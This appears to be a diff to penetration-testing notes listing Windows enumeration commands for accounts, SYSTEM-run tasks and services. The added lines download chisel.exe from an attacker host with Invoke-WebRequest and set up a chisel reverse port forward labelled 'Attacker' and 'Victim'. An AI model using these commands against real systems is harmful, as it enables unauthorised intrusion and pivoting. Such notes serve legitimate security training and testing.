@@ -31,6 +31,9 @@ net session
 net config workstation
 Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True'"
 
+# Ports used
+netstat -ano
+
 # Scheduled tasks
 Get-ScheduledTask
 Get-ScheduledTask | where {$_.Principal.UserId -eq "NT AUTHORITY\SYSTEM"}
@@ -46,4 +49,20 @@ Get-WmiObject win32_service | Where-Object {$_.StartName -like "NT Authority*"}
 # Check installed Software
 Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
 Get-CimInstance -ClassName Win32_Product | Select-Object Name, Version
+```
+
+## Utils
+
+### Powershel http fetch
+```powershell
+Invoke-WebRequest -Uri "http://10.10.10.10:8000/chisel.exe" -OutFile "chisel.exe"
+```
+
+### Chisel port forwarding
+```powershell
+# Attacker
+chisel server -p 8000 --reverse
+
+# Victim
+chisel client http://x.x.x.x:8000 R:9200:localhost:9200
 ```
